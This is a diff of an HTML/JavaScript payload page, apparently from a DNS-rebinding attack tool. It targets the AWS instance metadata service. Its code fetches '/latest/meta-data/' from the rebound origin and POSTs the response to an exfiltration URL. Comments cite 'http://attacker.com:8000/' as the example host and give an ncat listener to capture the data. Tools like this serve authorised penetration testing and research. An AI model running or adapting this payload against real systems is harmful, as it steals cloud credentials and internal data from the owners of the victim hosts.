@@ -1,10 +1,15 @@
 <!--
 This is a sample payload to make an AWS GET request and exfiltrate the response.
-Replace `EXFILTRATION_HOST` with the host to exfiltrate data to e.g. http://attacker.com:8000/
-running `nc -lkv 8000` on this host.
-Change the AWS metadata URL as appropriate. e.g. `/latest/meta-data/...`.
-Mostly useful with a headless browser such as Google Chrome.
+Replace `EXFILTRATION_URL` with the host to exfiltrate data to e.g. http://attacker.com:8000/
+Change `AWS_METADATA_PATH` as appropriate. e.g. `/latest/meta-data/`...
+Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the host to capture the exfiltrated data.
+
+Useful with a headless browser such as Google Chrome.
 e.g. "Google\ Chrome --headless --disable-gpu --print-to-pdf "http://attacker.com:80/manager.html?startattack=true&delaydomload=true&alert=false"
+
+When running the payload without user intervention, ensure that `manager-config.json` contains this payload only,
+and any other revelant information.
+
 -->
 <!doctype html>
 <html>
@@ -13,45 +18,45 @@ e.g. "Google\ Chrome --headless --disable-gpu --print-to-pdf "http://attacker.co
     <title>payload-aws-metadata</title>
     <script src="payload.js"></script>
     <script>
-        /**
-         * The attack() function is called when the user clicks the "Start Attack" button.
-         */
         function attack() {
-            /* Send a GET request to '/' (the root web directory) to the IP address and
-            port defined in the manager UI. */
-            fetch('/')
-                .then(responseOKOrFail("Could not submit a request to get a list of keys"))
-                .then(function (response) { // we successfully received the server response
-                    if (response.includes(indextoken) == false && response.length > 0) {
+            let response;
+            let EXFILTRATION_URL = "http://host:port/";
+            let AWS_METADATA_PATH = "/latest/meta-data/";
+            
+            fetch(AWS_METADATA_PATH)
+                .then(function (r) { //response
+                    response = r;
+                    if (response.status == 404) {
+                        throw new Error('404')
+                    } else if (response.ok) {
+                        console.log("attack frame ", window.location.hostname, " received a response")
+                        loc = window.location;
+                        return response.text()
+                    } else {
+                        throw new Error('Something is wrong')
+                    }
+                })
+                .then(function (data) { // data
+                    if (data.length > 0) {
                         clearInterval(timer); // stop the attack timer
                         console.log("SUCCESS"); // log to the console
-                        // Terminate the attack:
-                        // - display the response in a JavaScript alert()
-                        // - write the response to the JavaScript console
-                        fetch('EXFILTRATION_HOST', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                            },
-                            body: response
-                        })
-
-
-                        attackSuccess("Server response: " + response);
+                        exploit(EXFILTRATION_URL, data);
                     } else {
-                        // We saw the token in the response. DNS Rebinding did not happen.
-                        // Let's wait for the next time.
-                        throw new Error('hastoken');
+                        throw new Error('nodata')
                     }
+                }).then(function() {
+                    attackSuccess("Data was exfiltrated.");
                 })
                 .catch(function (error) {
                     if (error instanceof TypeError) { // We cannot establish an HTTP connection
                         console.log("frame " + window.location.hostname + " could not load");
                         window.parent.postMessage({
-                            status: "error",
+                            status: "error"
                         }, "*")
                     } else if (error.message == 'hastoken') {
                         console.log('DNS rebinding did not happen yet')
+                    } else if (error.message == 'nodata') {
+                        console.log('Empty response.')
                     } else if (error.message == '404') { // We received a 404
                         console.log("file not found. Frame " + window.location.hostname +
                             " has not updated dns yet, waiting " + interval +
@@ -59,19 +64,29 @@ e.g. "Google\ Chrome --headless --disable-gpu --print-to-pdf "http://attacker.co
                     } else { // We did not handle something
                         console.log('Unhandled error: ' + error);
                     }
-                });
-        };
+                })
+        }
 
+        function exploit(url, data) {
+            fetch(url, {
+                method: 'POST',
+                mode: "no-cors",
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+                },
+                body: data
+            });
+        }
     </script>
 </head>
 
 <body onload="begin();">
-        <h3>DNS Rebinding Vulnerability AWS Metadata</h3>
+    <h3>DNS Rebinding Vulnerability AWS Metadata</h3>
     <p>
         This page is waiting for a DNS update.
     </p>
-<script>
-</script>
+    <script>
+    </script>
 </body>
 
 </html>
